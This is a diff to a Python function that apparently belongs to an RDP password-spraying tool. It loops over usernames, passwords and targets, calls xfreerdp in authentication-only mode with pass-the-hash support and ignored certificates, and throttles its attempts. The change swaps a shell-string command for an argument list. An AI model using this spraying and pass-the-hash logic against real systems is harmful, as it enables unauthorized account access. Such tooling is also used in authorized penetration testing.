@@ -195,13 +195,25 @@ def attempts(users, passes, targets, domain, output_file_name, hostnames_strippe
                                 "hostnamectl set-hostname '%s'" % hostnames_stripped[
                                     attempts_hostname_counter],
                                 shell=True)
-                        auth_param = "/p:\"%s\"" % (password)
+                        
+                        command = [
+                            "xfreerdp",
+                            "/v:%s" % target,
+                            "+auth-only",
+                            "/d:%s" % domain,
+                            "/u:%s" % username,
+                            "/sec:nla",
+                            "/cert-ignore"
+                        ]
+
                         if pass_the_hash:
-                            auth_param = "/p:\"\" /pth:\"%s\"" % (password) # /p is needed for +auth-only, even with /pth
-                        spray = subprocess.Popen(
-                            "xfreerdp /v:'%s' +auth-only /d:%s /u:%s %s /sec:nla /cert-ignore" %
-                            (target, domain, username, auth_param), stdout=subprocess.PIPE,
-                            stderr=subprocess.PIPE, shell=True)
+                            command.append("/p:") # /p is needed for +auth-only, even with /pth
+                            command.append("/pth:%s" % password)
+                        else:
+                            command.append("/p:%s" % password)
+
+                        spray = subprocess.Popen(command, stdout=subprocess.PIPE,
+                            stderr=subprocess.PIPE)
                         output_error = spray.stderr.read()
                         output_info = spray.stdout.read()
                         # throttling requests
